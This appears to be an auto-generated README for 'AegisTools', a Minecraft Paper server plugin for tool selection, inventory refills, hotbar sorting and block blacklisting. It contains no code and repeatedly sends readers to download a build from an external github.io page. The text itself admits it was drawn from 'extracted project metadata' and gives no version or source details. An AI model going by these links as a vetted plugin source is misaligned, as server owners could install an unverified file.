# AegisTools - Game Script Utility 2026

> **AegisTools is a Minecraft plugin for Paper/Java servers that automates tool selection, inventory refills, and hotbar organization during repeated block-breaking activities.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Paper%2FJava-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/millerseanrpvv6047/aegistools-java-plugin?style=flat-square)](https://github.com/millerseanrpvv6047/aegistools-java-plugin)

---

<p align="center">
  <a href="https://millerseanrpvv6047.github.io/aegistools-java-plugin/">
    <img src="https://img.shields.io/badge/Download-AegisTools%20Script-brightgreen?style=for-the-badge" alt="Download AegisTools Script">
  </a>
</p>

> **[Download AegisTools](https://millerseanrpvv6047.github.io/aegistools-java-plugin/)**

---

[Download Latest Build](https://millerseanrpvv6047.github.io/aegistools-java-plugin/)

---

## What AegisTools Does

AegisTools is built for Java-based Minecraft servers using Paper. It takes care of several repetitive tasks that normally require manual inventory and hotbar management: the plugin identifies a fitting tool for the block being targeted, replenishes usable items from the player's inventory, and keeps tools arranged in the hotbar.

An in-game interface is included for maintaining a block blacklist. Players can use this GUI to decide which blocks should be left out of the automatic tool-selection process without leaving Minecraft. The plugin's updates are focused on its block-breaking and inventory-management helpers.

---

## Core Capabilities

- Picks an appropriate tool for the targeted Minecraft block.
- Refills supported blocks and items from the player's inventory.
- Arranges tools within the player's hotbar.
- Provides an in-game GUI for managing blacklisted blocks.
- Installs as a server-side plugin on Paper.
- Runs in Java-based Minecraft server environments.
- Keeps its primary helper functions lightweight at runtime.
- Assists with repeated mining and block-breaking tasks.

---

## Installation

1. Get the newest AegisTools build from the [download page](https://millerseanrpvv6047.github.io/aegistools-java-plugin/).
2. Verify that the server is running Paper with Java.
3. Copy the downloaded plugin file into the server's `plugins` directory.
4. Start the server, or restart it if it is already running.
5. Join the server and use the available in-game controls for tool behavior and block blacklist management.

Builds may use different plugin filenames. Place the downloaded file in the server directory without changing its name.

---

## Available Options

The plugin's behavior is organized around automatic tool choice, item replenishment, hotbar handling, and block exclusions.

| Option | Purpose |
|---|---|
| Tool selection | Selects a suitable tool for the block currently being targeted. |
| Inventory refill | Restores supported items and blocks using contents of the player's inventory. |
| Hotbar management | Keeps tools organized in the hotbar for recurring use. |
| Block blacklist | Lets players exclude chosen blocks through the in-game GUI. |

Block exclusions can be changed from the in-game blacklist interface. The remaining behavior comes from the installed plugin build, so available details may vary across releases.

---

## Supported Environment

- **Game:** Minecraft
- **Platform:** Paper
- **Runtime:** Java
- **Installation type:** Server-side Paper plugin

The extracted project metadata does not identify a particular Minecraft or Paper version. Before installation, consult the release information for the build being used. Results may differ on unsupported server versions or alongside plugins that alter inventory, hotbar, or block-breaking behavior.

---

## Changelog

### 2026

- Prepared documentation for the AegisTools Paper/Java Minecraft plugin.
- Documented the main functions: tool switching, inventory refilling, hotbar organization, and block blacklisting.

---

## Frequently Asked Questions

### What is the installation process?

Download a build, move its plugin file into the Paper server's `plugins` directory, and then start or restart the server.

### Is AegisTools a client-side tool?

No. AegisTools is described as a server-side plugin intended for Minecraft servers running Paper.

### How can I prevent certain blocks from using the tool workflow?

Open the in-game GUI and add the blocks you want excluded to the blacklist.

### Is hotbar behavior configurable?

Hotbar organization is included in the plugin's core behavior. The amount of customization available depends on the installed build and the settings it exposes.

### How do I install an update?

Download a newer build from the project download page and replace the current plugin file using your usual server plugin update procedure. Check the release details before applying the update.

### What Minecraft versions work with the plugin?

The available metadata lists Minecraft, Paper, and Java as the target environment, but it does not provide exact version numbers. Confirm compatibility in the release information for the build you plan to use.

### Where does the plugin file go?

Place the file in the Paper server's `plugins` directory. It should not be installed in the Minecraft client directory.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
